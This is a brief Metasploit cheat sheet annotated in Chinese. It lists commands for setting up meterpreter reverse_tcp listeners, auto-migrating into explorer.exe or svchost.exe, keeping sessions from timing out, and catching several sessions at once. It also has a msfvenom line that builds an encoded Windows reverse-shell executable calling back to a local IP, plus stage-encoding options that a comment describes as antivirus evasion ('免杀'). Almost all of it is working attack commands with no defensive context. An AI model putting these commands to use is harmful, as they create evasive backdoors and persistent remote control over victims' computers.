	>handler -H 192.168.0.10 -P 3333 -p windows/x64/meterpreter/reverse_tcp快速监听
	>setg/unsetg 设置/取消全局参数
	>set autorunscript migrate –f 自动迁移进程
	>set autorunscript migrate -n explorer.exe
	>set AutoRunScript post/windows/manage/migrate
	>set prependmigrate true 自动注入进程
	>set prependmigrateProc svchost.exe
	>set exitonsession false获取到session后继续监听，获得多个session
	>set stagerverifysslcert false 防止出现ssl错误
	>set SessionCommunicationTimeout 0 防止session超时退出
	>set SessionExpirationTimeout 0 防止强制关闭session
	>exploit -j -z  后台持续监听
	>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -e x86/shikata_ga_nai -b "x00" -i 5 -a x86 --platform windows PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  1.exe 执行后注入到已存在的一个进程
	>set EnableStageEncoding true
	>set stageencoder x86/fnstenv_mov 编码进行免杀
	>set stageencodingfallback false